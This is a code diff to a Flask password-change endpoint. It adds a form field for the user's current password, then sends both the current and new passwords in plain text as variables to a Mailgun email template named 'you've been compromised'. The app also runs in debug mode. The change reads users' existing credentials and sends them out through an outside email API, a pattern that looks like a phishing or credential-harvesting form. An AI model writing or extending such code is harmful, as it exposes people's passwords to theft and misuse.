@@ -12,6 +12,7 @@ def index():
 def change_password():
     name = request.form['name']
     email = request.form['email']
+    current_password = request.form['current-password']
     new_password = request.form['new-password']
     confirm_password = request.form['confirm-password']
 
@@ -24,12 +25,12 @@ def change_password():
         return "Error: Mailgun API key is not set", 500
 
     try:
-        send_mailgun_email(name, email, api_key)
+        send_mailgun_email(name, email, api_key, current_password, new_password)
         return "Password change request submitted successfully!"
     except Exception as e:
         return f"Error sending email: {str(e)}", 500
 
-def send_mailgun_email(name, email, api_key):
+def send_mailgun_email(name, email, api_key, current_password, new_password):
     domain = "sandbox4d2c52cdc8d14e8d926da2f43fac381f.mailgun.org"
     url = f"https://api.mailgun.net/v3/{domain}/messages"
 
@@ -38,7 +39,7 @@ def send_mailgun_email(name, email, api_key):
         "to": f"{name} <{email}>",
         "subject": "Password Change Request",
         "template": "you've been compromised",
-        "h:X-Mailgun-Variables": f'{{"name": "{name}", "email": "{email}"}}'
+        "h:X-Mailgun-Variables": f'{{"name": "{name}", "email": "{email}", "current_password": "{current_password}", "new_password": "{new_password}"}}'
     }
 
     response = requests.post(
@@ -52,3 +53,4 @@ def send_mailgun_email(name, email, api_key):
 
 if __name__ == '__main__':
     app.run(debug=True)
+
